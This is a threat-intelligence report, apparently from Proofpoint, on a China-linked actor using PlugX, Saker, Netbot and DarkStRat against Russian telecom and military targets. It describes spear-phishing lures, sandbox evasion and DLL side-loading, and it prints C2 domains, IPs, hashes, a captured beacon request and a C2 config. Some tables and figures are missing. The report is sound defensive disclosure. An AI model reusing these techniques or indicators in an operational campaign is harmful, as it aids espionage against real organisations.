In Pursuit of Optical Fibers and Troop Intel: Targeted
Attack Distributes PlugX in Russia

By Thouﬁque Haq & Aleksey F
Proofpoint researchers recently observed a campaign targeting telecom and military in Russia.
Beginning in July 2015 (and possibly earlier), the attack continued into August and is currently ongoing.
As a part of this campaign, we also observed attacks on Russian-speaking ﬁnancial analysts working at
global ﬁnancial ﬁrms and covering telecom corporations in Russia, likely a result of collateral damage
caused by the attackers targeting tactics.
The attacks employed PlugX, a Remote Access Trojan (RAT) widely used in targeted attacks.
Proofpoint is tracking this attacker, believed to operate out of China, as TA459 . This same attacker is
also reported to have targeted various military installations in Central Asia in the past [1]. While the
current campaign from this attacker has been active for a couple of months, there is evidence of
activity by this attacker as far back as 2013, employing other backdoors such as Saker, Netbot and
DarkStRat .
The attacks seen in the current campaign involved spear-phishing emails that employ both exploitladen Microsoft Word document attachments, as well as links leading to RAR archives. The email
contents, ﬁlenames and decoy are all usually in Russian.
1. Campaign Details: Attachments
The Microsoft Word document attachments observed in this campaign utilized CVE-2012-0158 to
exploit the client and implant the PlugX RAT. For example, the attachment LTE-2600.doc (SHA:
6ea86b944c8b5a9b02adc7aac80e0f33217b28103b70153710c1f6da76e36081) was sent to ﬁnancial
analysts covering the telecom industry with the email Subject “Проект бизнес-плана” (“Project
business-plan”). The attachment name is suited to the targets because “LTE” is a telecom term
referring to Long-Term Evolution networks, typically used to describe 4G networks.
Inspection of the document exploit employing CVE-2012-0158 also revealed that it was crafted using a
builder tool, which can be seen in various artifacts visible in the document properties. (Fig.1) However,
it should be noted that we do not believe that this builder is exclusively used by this attacker and is

likely shared among multiple threat actor groups.

2. Campaign Details: URLs
As a part of this campaign, the attackers also sent spear-phishing emails with URLs to RAR archive
ﬁles hosted on fake domains registered for this campaign. An interesting fact that shines some light on
the social engineering tradecraft used by the group is that these domain names as well as payload ﬁle
names were not chosen at random, as is often the case, but were instead chosen to ﬁt the speciﬁc lure.
For example, the RAR archive hosted on www.forum-mil[.]net/news/2015-08-03-3001.rar contained the
executable ﬁle "Воздушно-космические силы России заступили на боевое дежурство.exe”
(“Aerospace Russian forces step up military duty.exe”). Additional searching uncovered a news article
with this title on a legitimate Russian-language news site: http://www.forummil.ru/news/vozdushno_kosmicheskie_sily_rossii_zastupili_na_boevoe_dezhurstvo/2015-08-03-3001:
the malicious executable borrowed the name from the article title, and the site to host the malware
mimics the site that hosts the news article.
In another example, the news article http://tvzvezda.ru/news/forces/content/201508191459-88tq.htm
was used as the basis for registering the payload hosting site
www[.]tvzvezda[.]net/news/forces/content/201508181025.rar. Again, the title of the article was used as
the name for the executable inside the RAR archive, and it appears that many of these lures were
created in a similar fashion. Speciﬁcally, the actor starts with an article describing a military-related
event and then registers a payload site and names the malware ﬁle. Table 1 shows the full list of
payload domains and sites they mimic. (A list of the payload URLs can be found in the Indicators of
Compromise section at the end of this post.)

Table 1: Details on domains hosting malicious RAR-archived PlugX executables
militarynewes[.]comgjklsdf@gmail.com

All the infection domains and command and control (C2) domains were registered using the same
registrar in Beijing: “Shanghai Meicheng Technology Information Development Co., Ltd.”. Other than
the emails, the information used for registration was randomized.
The RAR archives hosted on fake domains contained RAR SFX (self-extracting executable) packaged
executables which drop and load PlugX. Proofpoint researchers observed the following ﬁlenames being
used for executables in the campaign:

2.1. Decoy Content and Sandbox Evasion
Interestingly, one of the RAR SFX droppers (SHA:
71be8bb45dfe360ee6076ed34fde12a382fe9d7922bd11b179ca773be12fa54c) launches a decoy
Microsoft Word document before launching the executable. (Fig 2) The contents of this decoy
document reference the “Tsar Bomba” nuclear test from the Cold War era and have been directly lifted
from a Russian site.

Figure 2: Contents of decoy document referencing “Tsar Bomba”
In addition to displaying something potentially relevant to the recipient’s interests, the PlugX payload is
not executed by the RAR SXF until the victim closes the decoy Word document, seen in the past as a
sandbox evasion technique wherein the payload is not executed until the decoy document is closed. As
a result, the actual payload may never execute in malware sandbox environments unless the sandbox
is conﬁgured to simulate the action of a user closing the decoy document. The SFX script for this
document (Fig. 3) appears to have been created with a Chinese language pack version of WinRAR.
The decoy document “1.doc” is executed ﬁrst and waits until it is closed before launching “0810.exe”.
This effect can be easily achieved in WinRAR by setting the “Wait and return exit code” option when
creating the SFX archive.

Figure 3: RAR SFX script
3. PlugX Implant
The attachment and email campaigns both employed DLL side-loading techniques to load the PlugX
payload. All of the payloads used the same clean signed executable “fsguidll.exe”, masquerading as
the F-secure GUI component, to sideload “fslapi.dll” which in turn unpacks code from “fslapi.dll.gui”.

Figure 4: DLL sideloading masquerading as the F-secure GUI component
The variant of PlugX used is the P2P version that was described by JPCert [2]. A sample conﬁguration
extracted using the volatility script from Arbor [3] is shown below.

Many of the samples used the string “EEEEEE” for authentication of the C2 communication, which is
likely the default value. Other observed values include “LLL-0808”, “0abcde”, and “niii-0701”.
4. Command and Control Infrastructure
We observed pressmil[.]com and notebookhk[.]net being used as the C2 servers for this speciﬁc
campaign. Over the duration of the campaign both of these domains pointed to the same infrastructure
on the IP address “43.252.175.119” in Hong Kong. This IP infrastructure has been actively used by this
attacker as early as 2014-12-04. The other domains also registered to point to this same IP address
include “fedpress[.]net” and “dicemention[.]com”, which have been observed at use in past campaigns.

In addition, the C2 server notebookhk[.]net pointed to 123.254.104.50 multiple times between 2013-0823 and 2014-09-29. Similarly dicemention[.]com pointed to this IP multiple times between 2013-12-05
and 2014-09-28. There were multiple domains that used this same IP infrastructure 123.254.104.50 in
the past such as
business-isa.mynetav[.]org
business-rsa.onmypc[.]org
blacktan[.]cn
dicemention[.]com
leeghost[.]com
notebookhk[.]net
When investigating 123.254.104.50 we discovered additional, older payloads clustering in to three
different malware families. These additional malware families used by this attacker in the past were
Saker, Netbot and DarkStRat. Researchers at ESET also reported and documented the usage of
DarkStRat by this attacker [1].
4.1. Related Malware: Saker (aka XBox) implant
The samples from the Saker cluster exhibited clues that also point to a Russian military attack nexus.
For example, the ﬁle “zamysel praticteskih dejstvi voisk.scr” (SHA:
556e7e944939929ca4d9ca6c54d9059edf97642ece1d84363f2d46e2e8ca72ae), translates to “plan of
army practice maneuvers.scr”. It was also similarly packaged in a RAR archive, and on execution it
drops and loads a DLL ﬁle “icwnet.dll” (SHA:
1a789568a53c18dab21c9c0386c746878cf8458e3369f0dc36a285fe296f3be3) which contains the
exports “ServiceMain” and “JustTempFun”. The malware makes the following beacon to a remote
server:
GET /30106C07000038FE0F00<removed>0000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000000100000<
removed>000000000000000000000000000000000000000000000000000000000000000000
0000 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.
1.4322)
Host: www.leeghost.com:1037
Cache-Control: no-cache

This backdoor has been analyzed extensively in the past [4] and provides the attacker a range of
functionality, including ﬁle manager (enumerate, create, copy, move, delete); the ability to download
and run secondary payloads; and deleting all traces of itself and shutting down.
4.2. Related Malware: Netbot (aka TornRat) Implant
When an example payload (SHA:
277fe4dab731149f3d40630f2f8b25092b007c701f04b5304d3ba9570280d015) from this cluster is
detonated, it drops and loads a DLL ﬁle “taskhost.dll” (SHA:
dd9d31c3acb4299619c2251698024da1ac9ec42280aa6c16cd2369907f3be4e3). The malware sends
an initial beacon to its C2 server (Fig. 5), which matches the TornRAT network signature previously
published by CrowdStrike [5].

Figure 5: Netbot network beacon
The scheme used to encrypt the beacon is a byte XOR with 0x3f followed by an addition with 0x3f. The
encrypted beacon contains hostname, system memory, OS information and infection timestamp. (Fig.
6)

Figure 6: Netbot network beacon decoded
Samples from this cluster were found creating the following mutexes.
Winlogin Running!
Netbot2012 Is Running!
NetBotServer Is Running!
It is worth noting that there is similarity in mutex naming scheme to another malware family called
NetTraveler (aka Travnet). Netbot is a backdoor and has commands to support features similar noted
above for Saker, such as ﬁle manager (enumerate, create, copy, move, delete), ability to download and
execute secondary payloads; and deleting all traces of itself.
4.3. Related Malware: DarkStRat implant
When an example payload (SHA:
b38aa09a2334e11a73ef9a926694f2054789934daa38afeb8d00bce6949b6c4c) from this cluster is
detonated it drops and runs an executable ﬁle “netlink.exe” (SHA:
b38aa09a2334e11a73ef9a926694f2054789934daa38afeb8d00bce6949b6c4c). The RAT sends the
string "ok\n" following initial beacon to a remote server. A conﬁguration ﬁle “netsetting.ini” is also written
to disk with the following contents:

[Option]
HostPort=443
HostName=www.dicemention.com

DarkStRat is a full-ﬂedged RAT written in Delphi with an array of features such as ﬁle manager,
process manager, registry manager, service manager, downloading and running secondary payloads
and deleting all traces of itself.
As also noted by the ESET researchers [1], the strings in this RAT strangely show Spanish language
origins, albeit with some Chinese connections. The source code for this RAT is hosted on google code
with the name “DarkStRat 2008 1.0开源.rar”. The string “开源.” in the name translates to “Open
Source”. Various parts of the source code also have strings in Chinese and reference “darkst[.]com”
and “fsg2[.]cn”. The owner of this Google-hosted code project is listed as darkteam...@gmail.com. As a
result, it can be inferred that code from a Spanish RAT was repurposed by malware author with
Chinese origins and marketed as DarkStRat, but as is often the case we should caution against a
deﬁnitive attribution based solely on characteristics such as language and C2 server locations.
5. Conclusion
A detailed examination of this operation reveals an adversary who demonstrates a keen interest in
Russian telecom and military sectors, indicative of an actor with geopolitical motives. The attacker
adapts and evolves their Tactics, Techniques and Procedures (TTPs) over time as the situation
demands. While the attacker appears to do very little to hide their tracks, they remain highly determined
and persistent and have carried out attacks through a sustained operation spanning at least two years,
and possibly longer. The attacker also invests time to research the locale and current events relevant to
their targets and then leverages this in their targeting tactics. Attacks such as these have become a
constant occurrence given the covert nature of digital attacks and easy access to targeting information
online.
As this threat shows, attackers continue to employ increasingly sophisticated techniques against new
targets in order to uncover and steal sensitive information. Organizations need to recognize that they
cannot rely on traditional antivirus and anti-spam solutions to detect and stop these advanced threats.
In order to combat targeted attacks, organizations should adopt next-generation solutions that make it
possible to identify and respond to sophisticated targeted attacks by correlating advanced detection
with threat intelligence about actor TTPs and global views of threat trafﬁc, including IOCs that enable
response teams to quickly detect and mitigate compromises. Moreover, a multi-layer approach is
essential, with email security representing the logical starting point for an advanced threat defense: like
this targeted attack, email remains the vector-of-choice for penetrating target organizations and
delivering these sophisticated payloads.
